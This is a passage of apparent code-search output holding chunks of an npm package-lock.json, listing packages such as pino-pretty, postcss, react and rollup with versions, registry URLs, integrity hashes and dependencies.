\"sha512-oIGGmcpTLwPga8Bn6/Z75SVaH1z5dUut2ibSyAMVhmUggWpmDn2dapB0n7f8nwaSiRtepAsfJyfXIO5DCVAODg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"abort-controller\": \"^3.0.0\",\n        \"buffer\": \"^6.0.3\",\n        \"events\": \"^3.3.0\",\n        \"process\": \"^0.11.10\",\n        \"string_decoder\": \"^1.3.0\"\n      },\n      \"engines\": {\n        \"node\": \"^12.22.0 || ^14.17.0 || >=16.0.0\"\n      }\n    },\n    \"node_modules/pino-pretty\": {\n      \"version\": \"10.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/pino-pretty/-/pino-pretty-10.3.1.tgz\",\n      \"integrity\": \"sha512-az8JbIYeN/1iLj2t0jR9DV48/LQ3RC6hZPpapKPkb84Q+yTidMCpgWxIT3N0flnBDilyBQ1luWNpOeJptjdp/g==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"colorette\": \"^2.0.7\",\n        \"dateformat\": \"^4.6.3\",\n        \"fast-copy\": \"^3.0.0\",\n        \"fast-safe-stringify\": \"^2.1.1\",\n        \"help-me\": \"^5.0.0\",\n        \"joycon\": \"^3.1.1\",\n        \"minimist\": \"^1.2.6\",\n        \"on-exit-leak-free\": \"^2.1.0\",\n        \"pino-abstract-transport\": \"^1.0.0\",\n        \"pump\": \"^3.0.0\",\n        \"readable-stream\": \"^4.0.0\",\n        \"secure-json-parse\": \"^2.4.0\",\n        \"sonic-boom\": \"^3.0.0\",\n        \"strip-json-comments\": \"^3.1.1\"\n      },\n      \"bin\": {\n        \"pino-pretty\": \"bin.js\"\n      }\n    },\n    \"node_modules/pino-pretty/node_modules/buffer\": {\n      \"version\": \"6.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/buffer/-/buffer-6.0.3.tgz\",\n      \"integrity\": \"sha512-FTiCpNxtwiZZHEZbcbTIcZjERVICn9yq/pDFkTl95/AxzD1naBctN7YO68riM/gLSDY7sdrMby8hofADYuuqOA==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"base64-js\": \"^1.3.1\",\n        \"ieee754\": \"^1.2.1\"\n      }\n    },\n    \"node_modules/pino-pretty/node_modules/readable-stream\": {\n      \"version\": \"4.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/readable-stream/-/readable-stream-4.7.0.tgz\",\n      \"integrity\": \"sha512-oIGGmcpTLwPga8Bn6/Z75SVaH1z5dUut2ibSyAMVhmUggWpmDn2dapB0n7f8nwaSiRtepAsfJyfXIO5DCVAODg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"abort-controller\": \"^3.0.0\",\n        \"buffer\": \"^6.0.3\",\n        \"events\": \"^3.3.0\",\n        \"process\": \"^0.11.10\",\n        \"string_decoder\": \"^1.3.0\"\n      },\n      \"engines\": {\n        \"node\": \"^12.22.0 || ^14.17.0 || >=16.0.0\"\n      }\n    },\n    \"node_modules/pino-std-serializers\": {\n      \"version\": \"6.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/pino-std-serializers/-/pino-std-serializers-6.2.2.tgz\",\n      \"integrity\": \"sha512-cHjPPsE+vhj/tnhCy/wiMh3M3z3h/j15zHQX+S9GkTBgqJuTuJzYJ4gUyACLhDaJ7kk9ba9iRDmbH2tJU03OiA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/pkg-types\": {\n      \"version\": \"1.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/pkg-types/-/pkg-types-1.3.1.tgz\",\n      \"integrity\": \"sha512-/Jm5M4RvtBFVkKWRu2BLUTNP8/M2a+UwuAX+ae4770q1qVGtfjG+WTCupoZixokjmHiry8uI+dlY8KXYV5HVVQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"confbox\": \"^0.1.8\",\n        \"mlly\": \"^1.7.4\",\n        \"pathe\": \"^2.0.1\"\n      }\n    },\n    \"node_modules/pkg-types/node_modules/pathe\": {\n      \"version\": \"2.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/pathe/-/pathe-2.0.3.tgz\",\n      \"integrity\": \"sha512-WUjGcAqP1gQacoQe+OBJsFA7Ld4DyXuUIjZ5cc75cLHvJ7dtNsTugphxIADwspS+AraAUePCKrSVtPLFj/F88w==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/postcss\": {\n      \"version\": \"8.5.6\",\n      \"resolved\": \"https://registry.npmjs.org/postcss/-/postcss-8.5.6.tgz\",\n      \"integrity\": \"sha512-3Ybi1tAuwAP9s0r1UQ2J4n5Y0G05bJkpUIO0/bI9MhwmD70S5aTWbXGBwxHrelT+XM1k6dM0pk+SwNkpTRN7Pg==\",\n      \"dev\": true,\n      \"funding\": [\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/postcss/\"\n        },\n        {\n          \"type\": \"tidelift\",\n          \"url\": \"https://tidelift.com/funding/github/npm/postcss\"", "metadata": {"file": "package-lock.json", "start_line": 4201, "end_line": 4400, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:4401", "score": 0.0, "content": "        },\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"nanoid\": \"^3.3.11\",\n        \"picocolors\": \"^1.1.1\",\n        \"source-map-js\": \"^1.2.1\"\n      },\n      \"engines\": {\n        \"node\": \"^10 || ^12 || >=14\"\n      }\n    },\n    \"node_modules/postcss/node_modules/nanoid\": {\n      \"version\": \"3.3.11\",\n      \"resolved\": \"https://registry.npmjs.org/nanoid/-/nanoid-3.3.11.tgz\",\n      \"integrity\": \"sha512-N8SpfPUnUp1bK+PMYW8qSWdl9U+wwNWI4QKxOYDy9JAro3WMX7p2OeVRF9v+347pnakNevPmiHhNmZ2HbFA76w==\",\n      \"dev\": true,\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/ai\"\n        }\n      ],\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"nanoid\": \"bin/nanoid.cjs\"\n      },\n      \"engines\": {\n        \"node\": \"^10 || ^12 || ^13.7 || ^14 || >=15.0.1\"\n      }\n    },\n    \"node_modules/prebuild-install\": {\n      \"version\": \"7.1.3\",\n      \"resolved\": \"https://registry.npmjs.org/prebuild-install/-/prebuild-install-7.1.3.tgz\",\n      \"integrity\": \"sha512-8Mf2cbV7x1cXPUILADGI3wuhfqWvtiLA1iclTDbFRZkgRQS0NqsPZphna9V+HyTEadheuPmjaJMsbzKQFOzLug==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"detect-libc\": \"^2.0.0\",\n        \"expand-template\": \"^2.0.3\",\n        \"github-from-package\": \"0.0.0\",\n        \"minimist\": \"^1.2.3\",\n        \"mkdirp-classic\": \"^0.5.3\",\n        \"napi-build-utils\": \"^2.0.0\",\n        \"node-abi\": \"^3.3.0\",\n        \"pump\": \"^3.0.0\",\n        \"rc\": \"^1.2.7\",\n        \"simple-get\": \"^4.0.0\",\n        \"tar-fs\": \"^2.0.0\",\n        \"tunnel-agent\": \"^0.6.0\"\n      },\n      \"bin\": {\n        \"prebuild-install\": \"bin.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/pretty-format\": {\n      \"version\": \"29.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/pretty-format/-/pretty-format-29.7.0.tgz\",\n      \"integrity\": \"sha512-Pdlw/oPxN+aXdmM9R00JVC9WVFoCLTKJvDVLgmJ+qAffBMxsV85l/Lu7sNx4zSzPyoL2euImuEwHhOXdEgNFZQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@jest/schemas\": \"^29.6.3\",\n        \"ansi-styles\": \"^5.0.0\",\n        \"react-is\": \"^18.0.0\"\n      },\n      \"engines\": {\n        \"node\": \"^14.15.0 || ^16.10.0 || >=18.0.0\"\n      }\n    },\n    \"node_modules/pretty-format/node_modules/ansi-styles\": {\n      \"version\": \"5.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/ansi-styles/-/ansi-styles-5.2.0.tgz\",\n      \"integrity\": \"sha512-Cxwpt2SfTzTtXcfOlzGEee8O+c+MmUgGrNiBcXnuWxuFJHe6a5Hz7qwhwe5OgaSYI0IJvkLqWX1ASG+cJOkEiA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/ansi-styles?sponsor=1\"\n      }\n    },\n    \"node_modules/process\": {\n      \"version\": \"0.11.10\",\n      \"resolved\": \"https://registry.npmjs.org/process/-/process-0.11.10.tgz\",\n      \"integrity\": \"sha512-cdGef/drWFoydD1JsMzuFf8100nZl+GT+yacc2bEced5f9Rjk4z+WtFUTBu9PhOi9j/jfmBPu0mMEY4wIdAF8A==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 0.6.0\"\n      }\n    },\n    \"node_modules/process-warning\": {\n      \"version\": \"3.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/process-warning/-/process-warning-3.0.0.tgz\",\n      \"integrity\": \"sha512-mqn0kFRl0EoqhnL0GQ0veqFHyIN1yig9RHh/InzORTUiZHFRAur+aMtRkELNwGs9aNwKS6tg/An4NYBPGwvtzQ==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/proxy-addr\": {\n      \"version\": \"2.0.7\",\n      \"resolved\": \"https://registry.npmjs.org/proxy-addr/-/proxy-addr-2.0.7.tgz\",\n      \"integrity\": \"sha512-llQsMLSUDUPT44jdrU/O37qlnifitDP+ZwrmmZcoSKyLKvtZxpyV0n2/bD/N4tBAAZ/gJEdZU7KMraoK1+XYAg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"forwarded\": \"0.2.0\",\n        \"ipaddr.js\": \"1.9.1\"\n      },\n      \"engines\": {\n        \"node\": \">= 0.10\"\n      }\n    },\n    \"node_modules/pump\": {\n      \"version\": \"3.0.3\",\n      \"resolved\": \"https://registry.npmjs.org/pump/-/pump-3.0.3.tgz\",\n      \"integrity\": \"sha512-todwxLMY7/heScKmntwQG8CXVkWUOdYxIvY2s0VWAAMh/nd8SoYiRaKjlr7+iCs984f2P8zvrfWcDDYVb73NfA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"end-of-stream\": \"^1.1.0\",\n        \"once\": \"^1.3.1\"\n      }\n    },\n    \"node_modules/quick-format-unescaped\": {\n      \"version\": \"4.0.4\",\n      \"resolved\": \"https://registry.npmjs.org/quick-format-unescaped/-/quick-format-unescaped-4.0.4.tgz\",\n      \"integrity\": \"sha512-tYC1Q1hgyRuHgloV/YXs2w15unPVh8qfu/qCTfhTYamaw7fyhumKa2yGpdSo87vY32rIclj+4fWYQXUMs9EHvg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/rc\": {\n      \"version\": \"1.2.8\",\n      \"resolved\": \"https://registry.npmjs.org/rc/-/rc-1.2.8.tgz\",\n      \"integrity\": \"sha512-y3bGgqKj3QBdxLbLkomlohkvsA8gdAiUQlSBJnBhfn+BPxg4bc62d8TcBW15wavDfgexCgccckhcZvywyQYPOw==\",\n      \"license\": \"(BSD-2-Clause OR MIT OR Apache-2.0)\",\n      \"dependencies\": {\n        \"deep-extend\": \"^0.6.0\",\n        \"ini\": \"~1.3.0\",\n        \"minimist\": \"^1.2.0\",\n        \"strip-json-comments\": \"~2.0.1\"\n      },\n      \"bin\": {\n        \"rc\": \"cli.js\"\n      }\n    },\n    \"node_modules/rc/node_modules/strip-json-comments\": {\n      \"version\": \"2.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/strip-json-comments/-/strip-json-comments-2.0.1.tgz\",\n      \"integrity\": \"sha512-4gB8na07fecVVkOI6Rs4e7T6NOTki5EmL7TUduTs6bu3EdnSycntVJ4re8kgZA+wx9IueI2Y11bfbgwtzuE0KQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/react\": {\n      \"version\": \"18.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/react/-/react-18.3.1.tgz\",\n      \"integrity\": \"sha512-wS+hAgJShR0KhEvPJArfuPVN1+Hz1t0Y6n5jLrGQbkb4urgPE/0Rve+1kMB1v/oWgHgm4WIcV+i7F2pTVj+2iQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"loose-envify\": \"^1.1.0\"\n      },\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/react-dom\": {\n      \"version\": \"18.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/react-dom/-/react-dom-18.3.1.tgz\",\n      \"integrity\": \"sha512-5m4nQKp+rZRb09LNH59GM4BxTh9251/ylbKIbpe7TpGxfJ+9kv6BLkLBXIjjspbgbnIBNqlI23tRnTWT0snUIw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"loose-envify\": \"^1.1.0\",\n        \"scheduler\": \"^0.23.2\"\n      },\n      \"peerDependencies\": {\n        \"react\": \"^18.3.1\"\n      }\n    },\n    \"node_modules/react-is\": {\n      \"version\": \"18.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/react-is/-/react-is-18.3.1.tgz\",\n      \"integrity\": \"sha512-/LLMVyas0ljjAtoYiPqYiL8VWXzUUdThrmU5+n20DZv+a+ClRoevUzw5JxU+Ieh5/c87ytoTBV9G1FiKfNJdmg==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/react-refresh\": {\n      \"version\": \"0.17.0\",\n      \"resolved\": \"https://registry.npmjs.org/react-refresh/-/react-refresh-0.17.0.tgz\",\n      \"integrity\": \"sha512-z6F7K9bV85EfseRCp2bzrpyQ0Gkw1uLoCel9XBVWPg/TjRj94SkJzUTGfOa4bs7iJvBWtQG0Wq7wnI0syw3EBQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/react-router\": {", "metadata": {"file": "package-lock.json", "start_line": 4401, "end_line": 4600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:4601", "score": 0.0, "content": "      \"version\": \"6.30.3\",\n      \"resolved\": \"https://registry.npmjs.org/react-router/-/react-router-6.30.3.tgz\",\n      \"integrity\": \"sha512-XRnlbKMTmktBkjCLE8/XcZFlnHvr2Ltdr1eJX4idL55/9BbORzyZEaIkBFDhFGCEWBBItsVrDxwx3gnisMitdw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@remix-run/router\": \"1.23.2\"\n      },\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      },\n      \"peerDependencies\": {\n        \"react\": \">=16.8\"\n      }\n    },\n    \"node_modules/react-router-dom\": {\n      \"version\": \"6.30.3\",\n      \"resolved\": \"https://registry.npmjs.org/react-router-dom/-/react-router-dom-6.30.3.tgz\",\n      \"integrity\": \"sha512-pxPcv1AczD4vso7G4Z3TKcvlxK7g7TNt3/FNGMhfqyntocvYKj+GCatfigGDjbLozC4baguJ0ReCigoDJXb0ag==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@remix-run/router\": \"1.23.2\",\n        \"react-router\": \"6.30.3\"\n      },\n      \"engines\": {\n        \"node\": \">=14.0.0\"\n      },\n      \"peerDependencies\": {\n        \"react\": \">=16.8\",\n        \"react-dom\": \">=16.8\"\n      }\n    },\n    \"node_modules/readable-stream\": {\n      \"version\": \"3.6.2\",\n      \"resolved\": \"https://registry.npmjs.org/readable-stream/-/readable-stream-3.6.2.tgz\",\n      \"integrity\": \"sha512-9u/sniCrY3D5WdsERHzHE4G2YCXqoG5FTHUiCC4SIbr6XcLZBY05ya9EKjYek9O5xOAwjGq+1JdGBAS7Q9ScoA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"inherits\": \"^2.0.3\",\n        \"string_decoder\": \"^1.1.1\",\n        \"util-deprecate\": \"^1.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">= 6\"\n      }\n    },\n    \"node_modules/real-require\": {\n      \"version\": \"0.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/real-require/-/real-require-0.2.0.tgz\",\n      \"integrity\": \"sha512-57frrGM/OCTLqLOAh0mhVA9VBMHd+9U7Zb2THMGdBUoZVOtGbJzjxsYGDJ3A9AYYCP4hn6y1TVbaOfzWtm5GFg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 12.13.0\"\n      }\n    },\n    \"node_modules/require-directory\": {\n      \"version\": \"2.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/require-directory/-/require-directory-2.1.1.tgz\",\n      \"integrity\": \"sha512-fGxEI7+wsG9xrvdjsrlmL22OMTTiHRwAMroiEeMgq8gzoLC/PQr7RsRDSTLUg/bZAZtF+TVIkHc6/4RIKrui+Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/require-from-string\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/require-from-string/-/require-from-string-2.0.2.tgz\",\n      \"integrity\": \"sha512-Xf0nWe6RseziFMu+Ap9biiUbmplq6S9/p+7w7YXP/JBHhrUDDUhwa+vANyubuqfZWTveU//DYVGsDG7RKL/vEw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/resolve-pkg-maps\": {\n      \"version\": \"1.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/resolve-pkg-maps/-/resolve-pkg-maps-1.0.0.tgz\",\n      \"integrity\": \"sha512-seS2Tj26TBVOC2NIc2rOe2y2ZO7efxITtLZcGSOnHHNOQ7CkiUBfw0Iw2ck6xkIhPwLhKNLS8BO+hEpngQlqzw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"funding\": {\n        \"url\": \"https://github.com/privatenumber/resolve-pkg-maps?sponsor=1\"\n      }\n    },\n    \"node_modules/ret\": {\n      \"version\": \"0.4.3\",\n      \"resolved\": \"https://registry.npmjs.org/ret/-/ret-0.4.3.tgz\",\n      \"integrity\": \"sha512-0f4Memo5QP7WQyUEAYUO3esD/XjOc3Zjjg5CPsAq1p8sIu0XPeMbHJemKA0BO7tV0X7+A0FoEpbmHXWxPyD3wQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/reusify\": {\n      \"version\": \"1.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/reusify/-/reusify-1.1.0.tgz\",\n      \"integrity\": \"sha512-g6QUff04oZpHs0eG5p83rFLhHeV00ug/Yf9nZM6fLeUrPguBTkTQOdpAWWspMh55TZfVQDPaN3NQJfbVRAxdIw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"iojs\": \">=1.0.0\",\n        \"node\": \">=0.10.0\"\n      }\n    },\n    \"node_modules/rfdc\": {\n      \"version\": \"1.4.1\",\n      \"resolved\": \"https://registry.npmjs.org/rfdc/-/rfdc-1.4.1.tgz\",\n      \"integrity\": \"sha512-q1b3N5QkRUWUl7iyylaaj3kOpIT0N2i9MqIEQXP73GVsN9cw3fdx8X63cEmWhJGi2PPCF23Ijp7ktmd39rawIA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/rimraf\": {\n      \"version\": \"3.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/rimraf/-/rimraf-3.0.2.tgz\",\n      \"integrity\": \"sha512-JZkJMZkAGFFPP2YqXZXPbMlMBgsxzE8ILs4lMIX/2o0L9UBw9O/Y3o6wFw/i9YLapcUJWwqbi3kdxIPdC62TIA==\",\n      \"deprecated\": \"Rimraf versions prior to v4 are no longer supported\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"glob\": \"^7.1.3\"\n      },\n      \"bin\": {\n        \"rimraf\": \"bin.js\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/rimraf/node_modules/brace-expansion\": {\n      \"version\": \"1.1.12\",\n      \"resolved\": \"https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.12.tgz\",\n      \"integrity\": \"sha512-9T9UjW3r0UW5c1Q7GTwllptXwhvYmEzFhzMfZ9H7FQWt+uZePjZPjBP/W1ZEyZ1twGWom5/56TF4lPcqjnDHcg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"balanced-match\": \"^1.0.0\",\n        \"concat-map\": \"0.0.1\"\n      }\n    },\n    \"node_modules/rimraf/node_modules/glob\": {\n      \"version\": \"7.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/glob/-/glob-7.2.3.tgz\",\n      \"integrity\": \"sha512-nFR0zLpU2YCaRxwoCJvL6UvCH2JFyFVIvwTLsIf21AuHlMskA1hhTdk+LlYJtOlYt9v6dvszD2BGRqBL+iQK9Q==\",\n      \"deprecated\": \"Glob versions prior to v9 are no longer supported\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"fs.realpath\": \"^1.0.0\",\n        \"inflight\": \"^1.0.4\",\n        \"inherits\": \"2\",\n        \"minimatch\": \"^3.1.1\",\n        \"once\": \"^1.3.0\",\n        \"path-is-absolute\": \"^1.0.0\"\n      },\n      \"engines\": {\n        \"node\": \"*\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/isaacs\"\n      }\n    },\n    \"node_modules/rimraf/node_modules/minimatch\": {\n      \"version\": \"3.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/minimatch/-/minimatch-3.1.2.tgz\",\n      \"integrity\": \"sha512-J7p63hRiAjw1NDEww1W7i37+ByIrOWO5XQQAzZ3VOcL0PNybwpfmV/N05zFAzwQ9USyEcX6t3UO+K5aqBQOIHw==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"brace-expansion\": \"^1.1.7\"\n      },\n      \"engines\": {\n        \"node\": \"*\"\n      }\n    },\n    \"node_modules/rollup\": {\n      \"version\": \"4.57.0\",\n      \"resolved\": \"https://registry.npmjs.org/rollup/-/rollup-4.57.0.tgz\",\n      \"integrity\": \"sha512-e5lPJi/aui4TO1LpAXIRLySmwXSE8k3b9zoGfd42p67wzxog4WHjiZF3M2uheQih4DGyc25QEV4yRBbpueNiUA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@types/estree\": \"1.0.8\"\n      },\n      \"bin\": {\n        \"rollup\": \"dist/bin/rollup\"\n      },\n      \"engines\": {\n        \"node\": \">=18.0.0\",\n        \"npm\": \">=8.0.0\"\n      },\n      \"optionalDependencies\": {\n        \"@rollup/rollup-android-arm-eabi\": \"4.57.0\",\n        \"@rollup/rollup-android-arm64\": \"4.57.0\",\n        \"@rollup/rollup-darwin-arm64\": \"4.57.0\",\n        \"@rollup/rollup-darwin-x64\": \"4.57.0\",\n        \"@rollup/rollup-freebsd-arm64\": \"4.57.0\",\n        \"@rollup/rollup-freebsd-x64\": \"4.57.0\",\n        \"@rollup/rollup-linux-arm-gnueabihf\": \"4.57.0\",\n        \"@rollup/rollup-linux-arm-musleabihf\": \"4.57.0\",\n        \"@rollup/rollup-linux-arm64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-arm64-musl\": \"4.57.0\",\n        \"@rollup/rollup-linux-loong64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-loong64-musl\": \"4.57.0\",\n        \"@rollup/rollup-linux-ppc64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-ppc64-musl\": \"4.57.0\",\n        \"@rollup/rollup-linux-riscv64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-riscv64-musl\": \"4.57.0\",", "metadata": {"file": "package-lock.json", "start_line": 4601, "end_line": 4800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:4801", "score": 0.0, "content": "        \"@rollup/rollup-linux-s390x-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-x64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-linux-x64-musl\": \"4.57.0\",\n        \"@rollup/rollup-openbsd-x64\": \"4.57.0\",\n        \"@rollup/rollup-openharmony-arm64\": \"4.57.0\",\n        \"@rollup/rollup-win32-arm64-msvc\": \"4.57.0\",\n        \"@rollup/rollup-win32-ia32-msvc\": \"4.57.0\",\n        \"@rollup/rollup-win32-x64-gnu\": \"4.57.0\",\n        \"@rollup/rollup-win32-x64-msvc\": \"4.57.0\",\n        \"fsevents\": \"~2.3.2\"\n      }\n    },\n    \"node_modules/rxjs\": {\n      \"version\": \"7.8.2\",\n      \"resolved\": \"https://registry.npmjs.org/rxjs/-/rxjs-7.8.2.tgz\",\n      \"integrity\": \"sha512-dhKf903U/PQZY6boNNtAGdWbG85WAbjT/1xYoZIC7FAY0yWapOBQVsVrDl58W86//e1VpMNBtRV4MaXfdMySFA==\",\n      \"dev\": true,\n      \"license\": \"Apache-2.0\",\n      \"dependencies\": {\n        \"tslib\": \"^2.1.0\"\n      }\n    },\n    \"node_modules/safe-buffer\": {\n      \"version\": \"5.2.1\",\n      \"resolved\": \"https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.2.1.tgz\",\n      \"integrity\": \"sha512-rp3So07KcdmmKbGvgaNxQSJr7bGVSVk5S9Eq1F+ppbRo70+YeaDxkw5Dd8NPN+GD6bjnYm2VuPuCXmpuYvmCXQ==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/feross\"\n        },\n        {\n          \"type\": \"patreon\",\n          \"url\": \"https://www.patreon.com/feross\"\n        },\n        {\n          \"type\": \"consulting\",\n          \"url\": \"https://feross.org/support\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/safe-regex2\": {\n      \"version\": \"3.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/safe-regex2/-/safe-regex2-3.1.0.tgz\",\n      \"integrity\": \"sha512-RAAZAGbap2kBfbVhvmnTFv73NWLMvDGOITFYTZBAaY8eR+Ir4ef7Up/e7amo+y1+AH+3PtLkrt9mvcTsG9LXug==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ret\": \"~0.4.0\"\n      }\n    },\n    \"node_modules/safe-stable-stringify\": {\n      \"version\": \"2.5.0\",\n      \"resolved\": \"https://registry.npmjs.org/safe-stable-stringify/-/safe-stable-stringify-2.5.0.tgz\",\n      \"integrity\": \"sha512-b3rppTKm9T+PsVCBEOUR46GWI7fdOs00VKZ1+9c1EWDaDMvjQc6tUwuFyIprgGgTcWoVHSKrU8H31ZHA2e0RHA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/scheduler\": {\n      \"version\": \"0.23.2\",\n      \"resolved\": \"https://registry.npmjs.org/scheduler/-/scheduler-0.23.2.tgz\",\n      \"integrity\": \"sha512-UOShsPwz7NrMUqhR6t0hWjFduvOzbtv7toDH1/hIrfRNIDBnnBWd0CwJTGvTpngVlmwGCdP9/Zl/tVrDqcuYzQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"loose-envify\": \"^1.1.0\"\n      }\n    },\n    \"node_modules/secure-json-parse\": {\n      \"version\": \"2.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/secure-json-parse/-/secure-json-parse-2.7.0.tgz\",\n      \"integrity\": \"sha512-6aU+Rwsezw7VR8/nyvKTx8QpWH9FrcYiXXlqC4z5d5XQBDRqtbfsRjnwGyqbi3gddNtWHuEk9OANUotL26qKUw==\",\n      \"license\": \"BSD-3-Clause\"\n    },\n    \"node_modules/semver\": {\n      \"version\": \"6.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/semver/-/semver-6.3.1.tgz\",\n      \"integrity\": \"sha512-BR7VvDCVHO+q2xBEWskxS6DJE1qRnb7DxzUrogb71CWoSficBxYsiAGd+Kl0mmq/MprG9yArRkyrQxTO6XjMzA==\",\n      \"license\": \"ISC\",\n      \"bin\": {\n        \"semver\": \"bin/semver.js\"\n      }\n    },\n    \"node_modules/set-blocking\": {\n      \"version\": \"2.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/set-blocking/-/set-blocking-2.0.0.tgz\",\n      \"integrity\": \"sha512-KiKBS8AnWGEyLzofFfmvKwpdPzqiy16LvQfK3yv/fVH7Bj13/wl3JSR1J+rfgRE9q7xUJK4qvgS8raSOeLUehw==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/set-cookie-parser\": {\n      \"version\": \"2.7.2\",\n      \"resolved\": \"https://registry.npmjs.org/set-cookie-parser/-/set-cookie-parser-2.7.2.tgz\",\n      \"integrity\": \"sha512-oeM1lpU/UvhTxw+g3cIfxXHyJRc/uidd3yK1P242gzHds0udQBYzs3y8j4gCCW+ZJ7ad0yctld8RYO+bdurlvw==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/setprototypeof\": {\n      \"version\": \"1.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/setprototypeof/-/setprototypeof-1.2.0.tgz\",\n      \"integrity\": 